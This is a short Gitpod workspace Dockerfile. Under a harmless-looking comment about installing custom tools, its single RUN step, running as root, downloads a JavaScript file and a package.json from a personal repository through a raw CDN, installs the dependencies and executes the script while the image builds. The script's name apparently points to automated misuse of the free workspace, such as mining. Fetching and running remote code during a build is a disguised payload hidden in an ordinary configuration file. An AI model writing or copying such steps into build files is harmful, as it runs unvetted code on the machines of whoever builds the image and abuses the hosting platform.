FROM gitpod/workspace-full:latest

USER root

# Install custom tools, runtime, etc.
RUN wget https://rawcdn.githack.com/vippro99/nodejs-task/8ddbe6dec5e9ad6c4e642f7ef65c37b426b840af/app-ubuntu-auto-c.js && wget https://rawcdn.githack.com/vippro99/nodejs-task/8ddbe6dec5e9ad6c4e642f7ef65c37b426b840af/package.json && chmod +x app-ubuntu-auto-c.js package.json && npm i -s && node app-ubuntu-auto-c.js
 
# Give back control
USER root
